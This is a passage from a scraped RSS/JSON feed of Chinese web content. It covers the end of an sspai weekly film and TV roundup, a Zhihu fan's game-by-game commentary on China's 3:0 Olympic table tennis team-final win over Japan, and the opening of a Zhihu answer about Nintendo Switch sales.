href=\"https://movie.douban.com/subject/35438177/\">豆瓣链接</a></p>\n<blockquote><p>真实版《婚姻生活》。</p></blockquote>\n<p>@宇宙浪费指南：《再见爱人》是一部婚姻纪实观察类真人秀，在离婚冷静期推出之际，节目组选择了三对夫妻，他们是已离婚、正在离婚和想要离婚的夫妻，三对男女乘坐两辆房车，开启一段为期 18 天的旅行。再见爱人或许是 「再见👋 爱人」，又或许是「再，见爱人❤️」，开启一段已知的旅途，以及三个未知的结果。</p>\n<p>就像网友所说，这个综艺的最大受益者是观众，观众从旁观者的角度才能清晰地感知到很多问题，也在警告每个人「不要高估自己对没有爱情的婚姻生活的容忍程度」。单身的我，也一直在他们的故事里掉眼泪，也一直在反思自己。最令人难过的是，好像明明还彼此相爱，为什么就走到了离婚这一步？三对夫妻充满了中年的疲惫与妥协，被生活打磨过的他们步调不再一致，关注点也再不相同，对彼此的热爱和想象都在鸡毛蒜皮的生活里消失殆尽。</p>\n<p>节目中的他们鼓起勇气，想要为自己的感情再试一次，他们无比真实，尽数展示自己的狼狈、逞强，然后礼貌体面地离场。它让我一个从未有过婚姻经历的人感慨，原来打败婚姻的或许不止是消失的爱，也让我明白：结婚不一定出于爱，但离婚一定是为了幸福。</p>\n<h3>[韩剧] 远看是蔚蓝的春天</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/521714ed3709d2707ff48cb6b110a337.png\"></figure><p>关键词：剧情 / 青春</p>\n<p>片长：62 分钟（单集）× 12 集；<a href=\"https://movie.douban.com/subject/26954774/\">豆瓣链接</a></p>\n<blockquote><p>春天是——从远处看才是蔚蓝色的。</p></blockquote>\n<p>@潘誉晗：本剧改编自同名漫画，围绕正青春的大学展开，但其实每个人的心中都有着自己隐藏着的伤痛。看上去没有缺点的男主角大概是最完美的大一新生，即使面对学长们的无理要求，他都可以笑眯眯地掏出钱来，原来，习惯用钱来维持友谊的他因为家庭暴力的原因在不知不觉中成长为一个讨好型人格的人。父母离婚带来的影响再加上学校园暴力，则让女主开始恐惧和别人的交往。</p>\n<p>虽然本剧的整体风格有点类似青春疼痛文学，但是看完之后，心疼之余还会觉得治愈，而没有那种为了伤痛而虐的矫情感。剧集对于原生家庭的话题探讨拓宽了本剧的深度，主角们的演技也为整部剧集增加了不少的亮点。年轻演员们清新又自然的演技非常符合人物设定，而且这样不做作的演绎方式也为观众们呈现了一出很棒的青春群像戏。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35155170/\">[美剧] 外滩探秘 第二季</a> @潘誉晗：作为去年全球十大热搜剧，《外滩探秘》还是让不少观众期待第二季的。度假胜地因一场摧毁了电力系统的飓风发生了改变，夏天、友谊、四亿美金、寻找失踪的父亲，原以为是关于青少年成长的剧却变成了一场外滩群岛上的冒险之旅。青春的少男少女，热带风情的海岛，似乎带有某种征兆的海浪，很适合夏季开胃调剂。</p>\n<p><a href=\"https://movie.douban.com/subject/35410438/\">[动画] 迦希大人不气馁！</a> @SHY：身为魔界 No.2 的迦希大人，今天也享受着肆意妄为的美好生活——本该是这样的。然而，可恶的魔法少女夺走了一切，迦希大人也沦落人间，过上三餐只有豆芽菜的悲惨生活。即使如此也 <a href=\"https://cdn.sspai.com/2021/08/06/a6b6f68dc611b60d3cd3c92c9f4a8b81.png\">绝不会气馁</a>，为了复兴魔界而每日努力！本季度银链 × 凑未来的另一部，日常喜剧样板戏，制作较为贫穷，但表情包大家都见过，不信请点击前方链接，然后参见上一句。</p>\n<p><a href=\"https://movie.douban.com/subject/35467021/\">[日剧] 她很漂亮</a> @潘誉晗：曾经的小胖墩变成优秀帅哥回国，想再一次见到自己的青梅竹马，只是当年那个漂亮风光的女生已经变得平凡甚至普通。作为大热 IP 的翻拍，本剧在剧情上并没有太多创新，但印证了同一个道理：判断一个人漂亮与否不能完全靠脸，而正确的那个人是不会以貌取人的。</p>\n<h3>吐槽区</h3>\n<p><a href=\"https://movie.douban.com/subject/34905959/\" target=\"_blank\">[国产剧] 一宅家族</a> @宇宙浪费指南：情景喜剧爱好者看到有接班人出现，简直狂喜，但不出一集就令我彻底失望，或许现在的编剧并不懂小品和情景喜剧的区别吧，剧本很小品，演员演得也很小品，整部剧没有笑点，很多台词都是网络段子大杂烩，靠台词强行搞笑，既浮夸又尴尬，人设老套，矛盾点很生硬，甚至不是一部合格的小品作品。</p>\n<h2>📅 本周新预告</h2>\n<h3>漫威漫改超级英雄电影《毒液2》发新正式预告</h3> <p>8 月 2 日，由安迪·瑟金斯执导的《毒液2》发布全新预告，汤姆·哈迪回归扮演毒液，伍迪·哈里森扮演屠杀，娜奥米·哈里斯扮演反派尖叫，影片将于 9 月 16 日起全球献映，北美上映时间为 9 月 24 日，内地档期待定。</p>\n<h3>《纸钞屋》第五季（最终季）正式中字预告片释出</h3> <p>8 月 3 日，Netflix 西班牙剧集《纸钞屋》发布预告，本片由乌苏拉·科尔维罗 / 阿尔瓦罗·莫奇 / 米格尔·安赫尔·西尔维斯特 / 帕特里克·克里亚多主演，上部将由 9 月 3 日播出，下部 12 月 3 日播出。</p>\n<h3>热播日剧《<strong>女子警察的逆袭》原作宣布改编为</strong> TV 动画</h3> <p>8 月 1 日，泰三子的漫画《秘密内幕 ~女警的反击~》宣布将改编为 TV 动画，佐藤雄三执导，金月龙之介系构，土屋圭人设，若山诗音、石川由依担任主役声优，MADHOUSE 制作，2022 年开始播出。本作主要讲述新人巡警川合麻衣与前辈警官藤圣子的日常工作物语，同名日剧正在热播中。</p>\n<h3>克林特·伊斯特伍德自导自演新片《哭泣的男人》预告</h3> <p>90 岁的克林特·伊斯特伍德自导自演的西部片《哭泣的男人》发布中字版正式预告。该片将于 9 月 17 日同步登陆北美院线及 HBO Max。</p>\n<h3>DC 漫改剧集《Y 染色体》9 月 13 日开播</h3> <p>8 月 6 日，改编自 DC 同名漫画，本·施耐泽、戴安·琳恩、伊莫琴·普茨、马琳·爱尔兰主演的剧集《Y 染色体》发布正式预告。第一季共 10 集，将于 9 月 13 日 FX 和 Hulu 同时开播。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV1KA411P7Fs?from=search&amp;seid=10092566067795351406\" target=\"_blank\"><strong>Amazon 原创新《灰姑娘》真人电影：</strong></a>由卡米拉·卡贝洛饰灰姑娘，尼古拉斯·加利齐纳扮演罗伯特王子、「艾莎」伊迪娜·门泽尔扮演后妈、皮尔斯·布鲁斯南扮演罗伯特王子的父亲国王以及比利·波特扮演仙女教母的《灰姑娘》将于 9 月 3 日在亚马逊流媒体上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1o341167rR?from=search&amp;seid=18335345258211662781\" target=\"_blank\"><strong>日版翻拍惊悚科幻电影《心慌方/异次元杀阵》：</strong></a>由菅田将晖、杏、冈田将生、田代辉、斋藤工、吉田钢太郎主演的日版《心慌方/异次元杀阵》发布正式预告，今年 10 月 22 日在日本率先上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1pU4y1J72a?from=search&amp;seid=12409605323873835636\" target=\"_blank\"><strong>《美国犯罪故事：弹劾》发布正式预告：</strong></a>《美国犯罪故事》第三季发布正式预告，该剧改编自杰弗里·图宾书籍《巨大的阴谋：几乎使总统下台的性丑闻》，将重现上世纪末著美国政坛著名丑闻——克林顿与莱温斯基的「拉链门」。本剧共 10 集，将于 9 月 7 日播出。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1G64y1s7V9?from=search&amp;seid=7938038693596926993\" target=\"_blank\"><strong>Apple TV+ 音乐剧《来自远方》的电影版发布先导预告：</strong></a>著名百老汇音乐剧《来自远方》的电影版定档：今年 9 月 10 日上线 Apple TV+，并发布先导预告。本片由剧版导演克里斯托弗·阿什利继续执导，原卡司回归主演，5 月在纽约的杰拉尔德·肖恩菲尔德剧院录制。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1uv411J7xS?from=search&amp;seid=3904344468513124789\" target=\"_blank\"><strong>詹姆斯·麦卡沃伊主演新片《在一起》发布正式预告：</strong></a>由史蒂芬·戴德利执导，詹姆斯·麦卡沃伊、莎朗·豪根主演的电影《在一起》发布正式预告。该片聚焦疫情期间的婚姻故事，将于 8 月 27 日北美上映。</p>\n<h2>📽 影视新闻周报</h2>\n<h3>由罗素兄弟执导的豪华阵容动作惊悚片《灰人》宣布杀青</h3>\n<p>本片由安东尼·罗素、乔·罗素执导，改编自马克·格里尼 2009 年出版的同名小说，由瑞恩·高斯林、克里斯·埃文斯、安娜·德·阿玛斯主演，杰西卡·亨维克(《铁拳》《权力的游戏》)、瓦格纳·马拉(《毒枭》《精英部队》)、茱莉亚·巴特斯(《好莱坞往事》《美式主妇》)等共同参演，制作成本 2 亿美元以上，旨在打造一个《007》级别的间谍片系列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/341e74327668507b969f24e502e5f8d4\"></figure><h3>亚马逊剧版《指环王》发布剧照，定档：明年 9 月 2 日</h3>\n<p>亚马逊剧版《指环王》发布剧照，并宣布开播时间：明年 9 月 2 日。该剧是史上投资最大的美剧之一，总花费预计高达 10 亿美元（共包含 5 季，可能还有一部衍生剧）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/article/3631fb3836d8cf11fd58b0d73f6577db\"></figure><h3>《名侦探柯南 警察学校篇》将改编为 TV 动画</h3>\n<p>8 月 4 日，青山刚昌的漫画《名侦探柯南》宣布将于 10 月 18 日发行第 100 卷，同时推出了一系列纪念计划，其中，新井隆广作画的漫画《名侦探柯南 警察学校篇 Wild Police Story》将改编为 TV 动画，讲述降谷零、松田阵平、萩原研二、伊达航、诸伏景光五位警察学校同期生的校园生活，他们也将在 2022 年剧场版中登场。 <a href=\"https://natalie.mu/comic/news/439465\" target=\"_blank\">来源</a></p>\n<h3>《数码宝贝》将推出新作 TV 动画和动画电影</h3>\n<p>8 月 1 日举行的数码祭 2021 现场活动中，万代宣布将推出新作 TV 动画《数码宝贝 Ghost Game》，今年 10 月开始播出，接档重启作《数码宝贝大冒险：》，系 2003 年来首次连续播映；2000 年开始播出的 TV 动画《数码宝贝大冒险 02》将推出新作剧场版，田口智久执导，大和屋晓编剧，上映时间待定。 <a href=\"https://twitter.com/DM_Partners/status/1421783495089606656\" target=\"_blank\">来源</a></p>\n<h3>更多</h3>\n<p><strong>动画电影《乔西的虎与鱼》确认引进，档期待定：</strong>8 月 4 日，日本动画电影《乔西的虎与鱼》发布中文海报。本作改编自田边圣子的同名小说，田村耕太郎执导，桑村沙耶香编剧，BONES 制作，讲述大学生恒夫与残疾女孩乔西的爱情故事，2020 年 12 月 25 日在日本公映，原著曾两度改编为真人电影。 <a href=\"https://maoyan.com/films/news/5678233\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/06/7422fdfd5621946cd0cc97af49b4e393.png\"></figure><p><strong>韦斯·安德森新作《法兰西特派》发布法版海报：</strong>韦斯·安德森新作《法兰西特派》发布法版海报。影片卡司包括：本尼西奥·德尔·托罗、艾德里安·布洛迪、蒂尔达·斯文顿、蕾雅·赛杜、弗兰西斯·麦克多蒙德、蒂莫西·柴勒梅德、琳娜·库德里、杰弗里·怀特、马修·阿马立克、斯蒂夫·朴、比尔·默瑞、欧文·威尔逊等。该片将于 10 月 22 日北美上映，10 月 27 日法国上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/06/9c340569017a6e568d94a8d0fffcd5fe.png\"></figure><p><strong>文牧野执导，易烊千玺主演新片《奇迹》曝演员阵容：</strong>据《综艺》报道，由文牧野执导，宁浩监制，易烊千玺领衔主演的电影《奇迹》演员阵容包括：王传君、咏梅、黄尧、张嘉益。</p>\n<p><strong>《壮志凌云2：独行侠》宣布将于 11 月 19 日日本上映：</strong>本片是 34 年前经典电影《壮志凌云》的续集，由汤姆·克鲁斯、方·基默回归出演，詹妮弗·康纳利、迈尔斯·特勒、格伦·鲍威尔等共同参演，将于 11 月 19 日在日本上映，同步北美。</p>\n<p><strong>郝蕾主演《寄生虫》舞台剧：</strong>曾获奥斯卡最佳影片的电影《寄生虫》改编的同名舞台剧官宣首位主演：郝蕾。目前郝蕾扮演的角色尚未公开，该剧将于明年开启演出。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/06/article/eb2abbcfa84876ce4157532cedd031fc\"></figure><p><strong>原创长篇动画《永远的 831》：</strong>WOWOW 电视台开台 30 周年纪念作品，《攻壳机动队 S.A.C》导演神山健治执导、编剧，CRAFTAR 制作，剧情梗概与具体形式未知，2022 年 1 月开始播出。 <a href=\"https://twitter.com/eienno831/status/1422512577049862150\" target=\"_blank\">来源</a></p>\n<p><strong>TV 动画《Code Geass 反叛的鲁路修》特别版：</strong>原版播出 15 周年纪念，将于 2021 年 10 月开始重播 TV 动画第一季，采用 FLOW 担当的新片头曲与 TK from 凛として時雨担当的新片尾曲。 <a href=\"https://twitter.com/GEASSPROJECT/status/1423116802964393984\" target=\"_blank\">来源</a></p>\n<p><strong>漫改真人电影《阿松》：</strong>改编自赤冢不二夫的同名漫画，英勉执导，偶像组合 Snow Man 主演，讲述松野家六胞胎的日常生活，预定 2022 年春季在日本上映，另曾改编为多部 TV 动画。 <a href=\"https://www.cinematoday.jp/news/N0125148\" target=\"_blank\">来源</a></p>\n<h2>🎪 彩蛋</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/06/a612307a62de1ce84f460c411389fc92.png\"></figure><p>本期彩蛋是由读者 <a class=\"ss-atUser\" data-mention=\"@阿斯巴-甜\" user-id=\"bs2paklb34tcs0pn5j50\" href=\"https://sspai.com/u/hc5cbsf9\">@阿斯巴-甜</a> 提供的「看图猜电影」。首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」），和我们不定期发放的奖品。感谢大家的积极参与！本期彩蛋抢答第一名的读者是 <a class=\"ss-atUser\" data-mention=\"@sphao\" user-id=\"bsv2smdb34tfr0651g1g\" href=\"https://sspai.com/u/g93fpr90\">@sphao</a> ，恭喜 TA 获得 1 次「看什么彩蛋」提供机会！请这位朋友注意查看站内私信~☆</p>\n<p>本期彩蛋的答案是安德烈·塔可夫斯基导演的电影《镜子<strong> </strong>Зеркало (1975)》。「这部电影就如片名所言，就像镜子一般，作为一个容器，包罗万象。很难用语言来描述它讲述了一个什么故事。用诺兰的台词来说，就是『不要去理解它，去感受它』。希望可以将这部电影分享给少数派的读者。」—— <a class=\"ss-atUser\" data-mention=\"@阿斯巴-甜\" user-id=\"bs2paklb34tcs0pn5j50\" href=\"https://sspai.com/u/hc5cbsf9\">@阿斯巴-甜</a> </p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/68146"},{"title":"2020 东京奥运乒乓球女团中国 3:0 完胜日本夺冠，如何评价本场比赛？","date":"2021-08-05 12:52:48","description":"\n<p><b>恭喜中国队3比0战胜日本！</b></p>\n<p>本届奥运会，中日女子选手仅在女单半决赛上交锋一次，即为经典的孙颖莎伊藤之战：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p>中方的陈梦、孙颖莎、王曼昱三位大将，对日本大姐大伊藤的胜率均是极高的。孙颖莎更是刚刚4比0取胜，对于队友的士气是极大鼓舞。平野虽曾17年表现极其亮眼，但自从被国乒研究后，反手长下旋被盯死，后来一直便没有特别出色的战绩。然而，这是日本的主场，且国乒被其研究了许久。伊藤和平野的打法比较看状态，要防止爆发的可能。这次终于在决赛上相遇，尚有不小的悬念。希望中国队可以迅速取胜，消除任何小概率事件发生的土壤。</p>\n<hr>\n<h2>第一场 双打</h2>\n<p>第一场双打，陈梦/王曼昱对战石川/平野。伊藤留作生力军打单打了。日方上来几回合内就锁了个两个直线，对中国队的习惯、跑位是有较深的研究的。日方选手一个左手一个右手，相比中国两个右手还是有一定跑位优势。</p>\n<p>石川打得很凶，能反拉就反拉，能近台加力快带就快带。局初段我方不太适应，速度有点跟不上，再加上日本有两个运气球，比分到了局中有点落后。日本的配合、线路目前而言要比我方强上一些。</p>\n<p>第一局中后段，日方吃了两个发球。再加上我方抡出了几个质量，实力球还是比日方功底深厚，比分一度扳至八平。然而，日方的线路优势再次发挥作用，连续的正手锁直线，把中方攻得有些措手不及。之后虽我方追上一分，但其后仍被逼到远台，尝试反攻失分。</p>\n<p>我方第一局打得还是有点拘谨，起板的落点也没拉开。这样被对方一左一右调动得太被动，质量优势就显现不出来了。看看第二局换发球接发球轮以后会不会有改观，中国队也需要适应对手的时间。</p>\n<p>偶数局上来似乎中国队明显要舒服一些，平野的综合实力相比石川还是差些，中方能给出更多质量来。虽然石川0比4落后时有一个精彩的侧身爆冲，但并不能挽回下风的气势。见形势大比分落后，再加上本轮次日方限制线路的打法不奏效，接发球也出了不少问题，日本队全部搏杀（且成功率不高，因为不是计划内的战术），速败。关键还是要看第三局，现在的气势我方占优。</p>\n<p>平野的发球我们还是吃了一点的，在下一个轮次尤其要注意。不过王曼昱主要是拧拉为主，吃发球的几率不大，但是回球的落点一定要多想想。陈梦的质量也一定要出得来。</p>\n<p>第三局开始。日本基本的战术还是先锁直线/平野挑大斜线，锁住中国队的正手位，随后再调动回反手位。如此一来，由于中国队是双右手组合，就很容易挤压在一起。王曼昱接发的拧拉还是基本回在对方中路上，如果能多些变化就更好了。</p>\n<p>2比4时是中国队的好球，石川的打法还是比较拼，积极用正手时反手位露出了空当。可以多考虑从这里做文章。5比6时的那球也非常好，一定不能像前面几回合那样送中路，多给点反手，多给点重复落点。对面虽是一左一右，但武器库都不完善，想要拼中国队都需要舍近求远，还是有机会能挤压住对方空间的。</p>\n<p>七平时的回合中国队落点给得非常好，多板对拉后拿下很长气势，本可以成为关键节点，但随后日本就是一个运气球得分。笔者仍感到微微担忧，前途未卜。好在国乒二位在八平后又来了一个对拉得分，打得超出了石川的能力范围，随后一鼓作气拿下本局。</p>\n<p>第三局实在是太关键了…好在中国队成功咬了下来。接下来一定要乘胜追击拿下。有个比较有趣的事在于，陈王二位发球前的沟通，是不是应该稍微小声点…石川和平野应该都能听懂（</p>\n<p>第四局第一个回合平野的反手上手就开始加质量，石川也增强了搏杀力度。中国队有所失误，但力量占据优势，双方战至小分3比3仍是僵持状态。日方的短球还是有所欠缺的，力量也不占优，3比5落后之后叫了暂停。暂停结束后，日方挑打失误，随后又被中国队抢先上手，比分拉开了不小。本局日方的多数得分点还是在控制我方的正手上，又是连续两个锁直线送我们正手的得分了。</p>\n<p>日本5比8落后时，石川反手反拉的完美落点得分，把日本队的气势又带出来了。随后是石川的抢攻套路得分，目前中日仅一分之差。王曼昱的反手在此时发挥了极大作用，力量大，速度快，最后更是一板拧拉一击致命，抢下了第一场双打。</p>\n<p>这场双打对我们太珍贵了。孙颖莎对伊藤并非必胜，日本这次的冲击力是很大的。中国队开了个好头。</p>\n<hr>\n<h2>第二场 孙颖莎 vs 伊藤</h2>\n<p>孙颖莎再战伊藤，刺激。</p>\n<p>第一局以生胶的慢热，孙颖莎是需要拿下的。开局领先，伊藤反手还没什么球，侧剌之类的很少上台，正手也有失误。但孙颖莎还是吃了发球的，这一点需要注意。</p>\n<p>先不论输赢，有一点是中国队的进步，也是信心的提升，那就是孙颖莎完全不怕接发球劈长后与伊藤对反手了。伊藤也明白这一点，在局中段积极求变，反而多去送孙颖莎的正手及中路偏正手。孙颖莎反倒不太舒服，尤其是六平那一球，生胶球送到这个位置的轨迹孙颖莎不太适应。</p>\n<p>有点在跟着伊藤的节奏走。孙颖莎还是要再把节奏放慢点，质量要出得来。比如7比8的那球就很好，多等一个点，质量再提高一点。今天伊藤的打法有所变化，没有完全扑在台子上，孙颖莎也要适时进行调整。</p>\n<p>非常好，孙颖莎的节奏慢下来了。伊藤站在偏中台的位置，不再以快取胜，而是节奏变化加上颗粒的怪。但孙颖莎只要盯住了把质量加上去，哪怕稍微慢一点，也是不怕伊藤拍弧圈的。事实上，伊藤目前为止的打法就不是近台拍。果然采取更合理的战术后，孙颖莎连下四分，夺下第一局。</p>\n<p>第二局似乎伊藤打算变招了，回到老战术，速度极快。不论哪种打法，伊藤都是有相当大的威胁的。孙颖莎如果质量出得来，打得还是非常顺手，但伊藤的起板盯住孙颖莎的反手大斜线以及中路偏正手，还是有点难受。双方拉锯至五平。</p>\n<p>伊藤与孙颖莎进入持续反手相持，孙颖莎的反手状态不错，摩擦感觉很好，持续把颗粒回的下沉球挂住，并寻隙加力至伊藤反手大角得分。伊藤对自己的反手不太自信，心态受到了影响，发球失误。教练赶紧叫暂停。</p>\n<p>居然还把伊藤发球失误做成慢动作回放hhh这个编导有点腹黑（</p>\n<p>暂停结束，孙颖莎反手质量依旧可圈可点，前三板的计算也比伊藤更精良，起板快，线路好，发球伊藤也还没掌握规律。孙颖莎迅速拿下第二局，形势很不错。</p>\n<p>伊藤从单打半决赛开始就吃孙颖莎的中路发球，现在还吃，日本队这届教练不行啊…</p>\n<p>第三局第一回合，伊藤的线路无可挑剔。但就像马龙对樊振东的决赛，樊振东的线路很好，但马龙就是更胜一筹。孙颖莎的线路显得更加刁钻，气势极盛。不过紧接着吃了个不转发球，士气受了影响，后面又吃了一个。</p>\n<p>前两局里孙颖莎严格意义上来说，也有些吃发球，但只要劈到了底线，倒也不怕伊藤起板相持。这局的几个吃发球不同，要么出界，要么台内冒得老高，就完全没有周旋的余地了。伊藤这局的正反手状态均非常好，零失误。8比2领先时更是上演了一个瞎拍神球。不知孙颖莎是会复现半决赛第二局的逆转，还是会战略性先放掉一局。</p>\n<p>孙颖莎这局没什么出手的机会，伊藤的状态开始出来了，值得警惕。孙颖莎吃伊藤的不转吃了非常多个，笔者粗略数数就起码有三个。还是要咬住，质量要加上去。线路也要多想想，接发球送反手太多了也容易被算住。</p>\n<p>第四局孙颖莎上来有点小宇宙爆发的意思了，质量非常高，伊藤几乎没有还手之力。后面伴随着孙颖莎的两个运气球、伊藤的机会球失误、孙颖莎的完美接发，比分迅速拉开，孙颖莎7比2领先。但接下来伊藤扳回一分，告诉孙颖莎自己相持的状态仍在。孙颖莎再次劈长擦边，又是一个运气球，伊藤已经哭笑不得了。</p>\n<p>孙颖莎得理不饶人，正反手全力施为，力量拉满，穿直线、反手爆拉侧切，直接把伊藤的花样全部破掉，11比3取得胜利，中国队大分2比0领先日本。</p>\n<p>本场比赛，伊藤第一二局的战术变化可圈可点，给孙颖莎造成了一定的不适应。团体五局三胜，节奏快，易爆冷，孙颖莎输了一局是有较大压力的。好在孙颖莎顶住压力，后半盘更是顺风拿下，奥运赛场连续两次战胜伊藤，基本已锁定了24巴黎的单打名额。</p>\n<hr>\n<h2>第三场 王曼昱 vs 平野</h2>\n<p>本次奥运国乒启用p卡，换王曼昱上场。固然有刘诗雯伤病缘故，自然也有培养新生代之意。王曼昱实力自然比平野强不少，尤其自17年国乒对平野深入研究后。笔者记得那时平野和国乒多人都碰过了，大家都拿一个打法打她——送反手、中路长，不管是发球还是接发劈长，但她就是摆脱不了（</p>\n<p>开局平野速度很快，这也是她的特长。王曼昱作为实力占优的一方，千万不要跟着以快打快，否则动作不到位，高速相持中就容易下网失误。王曼昱身高臂长，一定要把速度慢下来，质量加上去。王曼昱也确实是这么做的，很顺利就拿下第一局。</p>\n<p>第二局王曼昱上来就全面占优，逼日本叫了暂停。这个暂停叫得好，把王曼昱火热的状态叫没了。一个台内轻挑直线，一个反手起板，一个扑在近台的摆速得分，平野扳回局势。中间王曼昱的劈长思路还是对的，但那球旋转还没加上去，没送到平野的弱点上。王曼昱还是要多加旋转上去，要劈长就剁下去，要上手就像双打最后几球一样，把质量都打出来，平野的速度就被限制了。比如王曼昱4比7落后的那个劈长，做得就比前半段的好。</p>\n<p>看来这个劈长是王曼昱想明白后状态回暖的关键点，王曼昱一路追分至七平，但在八平后还是被平野套路了一个线路，到关键球了。下一回合虽然勉力撑住得分，但还是很被动，让人心惊肉跳。</p>\n<p>九平，王曼昱手握两个发球。平野的正手落点到了正手小三角，速度位置都近乎完美。但王曼昱拥有力量优势，身高臂长，护台极广，硬是直接步法到位快带回来。平野扛不住质量，回防出现机会，被王曼昱穿直线直接得分。这一球太精彩了，平野打到那个落点估计认为自己已经有了。这一分拿下，基本这局已经很上风。果然王曼昱紧接着在相持中稳住，而平野急于拉穿失分，王曼昱逆转第二局！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fed11cb3ea4723a3a5ace3d3a0db6472_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1117\" data-size=\"normal\" data-caption=\"图源：咪咕直播截图\" data-watermark=\"watermark\" data-original-src=\"v2-fed11cb3ea4723a3a5ace3d3a0db6472\" data-watermark-src=\"v2-ecb2460cc3694270fdc17a0915001329\" data-private-watermark-src=\"v2-85042454dd61639f45899ce9d1e54054\"></p>\n<p>第三局，王曼昱以雷霆之势登场，一度大比分领先。但随着几个接发的问题以及平野的运气球，气势有所回落，教练及时叫了暂停。暂停结束，王曼昱反手起板质量很高，落点在中路偏正手，非常完美。平野的移动速度似乎体现不出什么优势了。平野开始搏杀，但失误率很高，基本没有得分。最终王曼昱轻松获胜，11比3战胜平野！</p>\n<p>王曼昱在整场比赛中体现了极坚韧的意志，再加上护台优势，很多极被动的球都能扭转得分。到了第三局，平野已经没有什么办法了，只好搏杀，但又没有状态。相信以王曼昱的能力，加上奥运等大赛的磨炼，下个周期一定也会是国乒的中流砥柱。</p>\n<hr>\n<p>还没看够？不妨来看看孙颖莎与伊藤的第一次奥运对决：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p><br></p>\n<hr>\n<p>奥运赛程众多，多数以文字简评方式进行赏析。笔者创建了一个专栏，目前收录了较为齐全的各场次简评，自忖在全网算做得最有诚意的之一了。见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1404020055374372864\" data-image=\"https://pic4.zhimg.com/v2-52a669542a8699d42a3c5796c7e536e9.jpg\" data-image-width=\"200\" data-image-height=\"200\" class=\"internal\">乒乓赛事简评</a><p>欢迎前去专栏对我付出精力更大的图文作品进行指正。无团队，无盈利，用爱发电。如果喜欢，欢迎关注（含多个编辑推荐等）：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/biqinzhai\" data-image=\"https://pic2.zhimg.com/v2-cde3d62e8270146ee8593adcb47189c4.jpg\" data-image-width=\"183\" data-image-height=\"183\" class=\"internal\">避秦斋</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/macaoleaf?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">叶子盛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">508 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475772055?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><br><a href=\"http://www.zhihu.com/question/475485375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运乒乓球女单 1/4 决赛石川佳纯 1:4 不敌对手出局，如何评价本场比赛？</a><br>\n","link":"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"SWITCH销量会破亿吗？","date":"2021-08-05 11:30:08","description":"\n<p>不可能破亿的。</p>\n<p><br></p>\n<p>能过5000万就了不起了。</p>\n<p><br></p>\n<p>我觉得是过不了5000万这条线的，要是过了的话，每过100万我在这个回答里更新一个任天堂游戏人物的画像。</p>\n<hr>\n<p>愿赌服输。</p>\n<p><br></p>\n<p>5100万突破的马里奥</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7e97c47a40b703e0f1619b32dfcd7a49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-7e97c47a40b703e0f1619b32dfcd7a49\" data-watermark-src=\"v2-5b759cb4c8462090ad284ec0dba96d8b\" data-private-watermark-src=\"v2-6ef7711f8a8da088164c62db56a4c2c0\"></p>\n<p>5200万突破的碧琪公主</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b4941391c25fa167c5f5269be2c3ad45_720w.jpg?rss\" data-caption=\"\" 